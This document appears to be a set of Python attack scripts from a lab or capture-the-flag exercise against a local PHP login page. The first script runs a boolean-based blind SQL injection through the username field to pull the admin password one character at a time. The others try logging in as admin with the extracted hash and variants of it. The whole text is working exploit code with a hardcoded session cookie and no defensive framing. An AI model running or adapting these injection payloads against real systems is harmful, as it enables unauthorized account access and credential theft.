import requests
import time

# Target details
base_url = "http://127.0.0.1:33038/index.php"
session_cookie = {"PHPSESSID": "ucv4hujhocgopm34cbotf0aitf"}

def send_payload(payload):
    """Send the SQL injection payload and return True if condition is true"""
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "Login"
    }
    try:
        response = requests.post(base_url, data=data, cookies=session_cookie, timeout=10)
        if '{"response":"password"}' in response.text:
            return True
        elif '{"response":"username"}' in response.text:
            return False
        else:
            print(f"[WARN] Unexpected response: {response.text[:200]}")
            return None
    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return None

def get_char_at_position(position):
    """Extract character at given position using binary search on ASCII values"""
    # Printable ASCII range: 32-126
    # More specific: likely alphanumeric + common symbols (48-57 = 0-9, 65-90 = A-Z, 97-122 = a-z)
    
    # Try common characters first: a-z, A-Z, 0-9
    common_chars = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
    
    for char in common_chars:
        payload = f"' or SUBSTRING((SELECT password FROM users WHERE username='admin'),{position},1)='{char}'-- -"
        result = send_payload(payload)
        if result:
            return char
        time.sleep(0.05)
    
    # If not found in common chars, do full ASCII search
    for ascii_val in range(32, 127):
        char = chr(ascii_val)
        if char in common_chars:
            continue  # Skip already tested
        payload = f"' or ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),{position},1))={ascii_val}-- -"
        result = send_payload(payload)
        if result:
            return char
        time.sleep(0.05)
    
    return None

# Extract password character by character
print("[*] Starting password extraction...")
extracted_password = ""

for pos in range(1, 33):  # 1 to 32 inclusive
    char = get_char_at_position(pos)
    if char:
        extracted_password += char
        print(f"[+] Position {pos}: '{char}' - Password so far: {extracted_password}")
    else:
        print(f"[!] Failed to extract character at position {pos}")
        extracted_password += "?"

print(f"\n[+] Complete extracted password: {extracted_password}")
print(f"[*] Length: {len(extracted_password)}")

import requests
import time
import hashlib

# Target details
base_url = "http://127.0.0.1:33038/index.php"
session_cookie = {"PHPSESSID": "ucv4hujhocgopm34cbotf0aitf"}

extracted_hash = "7d39307ae824e70052c0aa16816a9b16"

print("[*] Attempting authentication with extracted password hash...")
print(f"[*] Username: admin")
print(f"[*] Password: {extracted_hash}")

# Test 1: Try the raw hash as password
data = {
    "username": "admin",
    "password": extracted_hash,
    "submit": "Login"
}

response = requests.post(base_url, data=data, cookies=session_cookie, timeout=10)
print(f"\n[*] Test 1 - Hash as password:")
print(f"[+] Status: {response.status_code}")
print(f"[+] Response: {response.text}")
print(f"[+] Headers: {dict(response.headers)}")
print(f"[+] Cookies: {dict(response.cookies)}")
if 'dashboard' in response.text.lower() or response.status_code == 302:
    print("[+] SUCCESS: Logged in with hash!")

time.sleep(0.2)

# Test 2: Try MD5 of the hash
data["password"] = hashlib.md5(extracted_hash.encode()).hexdigest()
response2 = requests.post(base_url, data=data, cookies=session_cookie, timeout=10)
print(f"\n[*] Test 2 - MD5 of hash as password:")
print(f"[+] Status: {response2.status_code}")
print(f"[+] Response: {response2.text[:200]}")

time.sleep(0.2)

# Test 3: Try common password - if this is an MD5 hash, it might hash to something simple
# Let's try versions without case variations
for pwd in [extracted_hash, extracted_hash.upper(), extracted_hash.lower()]:
    data["password"] = pwd
    resp = requests.post(base_url, data=data, cookies=session_cookie, timeout=10)
    print(f"\n[*] Test with password: {pwd[:20]}...")
    print(f"[+] Response: {resp.text[:100]}")
    if 'dashboard' in resp.text.lower() or resp.status_code == 302:
        print(f"[+] SUCCESS! Password: {pwd}")
        break

import requests

# Target details
base_url = "http://127.0.0.1:33038"
session_cookie = {"PHPSESSID": "ucv4hujhocgopm34cbotf0aitf"}

extracted_hash = "7d39307ae824e70052c0aa16816a9b16"

# First, try login with the extracted password and check for redirect or dashboard
print("[*] Attempting login with extracted password...")
data = {
    "username": "admin",
    "password": extracted_hash,
    "submit": "Login"
}

# Set allow_redirects to False to see what the actual response is
response = requests.post(
    f"{base_url}/index.php", 
    data=data, 
    cookies=session_cookie, 
    allow_redirects=False,
    timeout=10
)

print(f"[*] Status Code: {response.status_code}")
print(f"[*] Response Text: {response.text}")
print(f"[*] Location Header: {response.headers.get('Location', 'None')}")
print(f"[*] Set-Cookie Header: {response.headers.get('Set-Cookie', 'None')}")

# Check all cookies
print(f"\n[*] Response Cookies: {dict(response.cookies)}")

# Check if there's a redirect
if response.status_code == 302 or response.status_code == 301:
    print("[+] Redirect detected, following...")
    redirect_url = response.headers.get('Location')
    
    # Follow the redirect
    r2 = requests.get(
        f"{base_url}/{redirect_url}", 
        cookies={**session_cookie, **response.cookies},
        timeout=10
    )
    print(f"[*] Dashboard Response: {r2.text[:500]}")

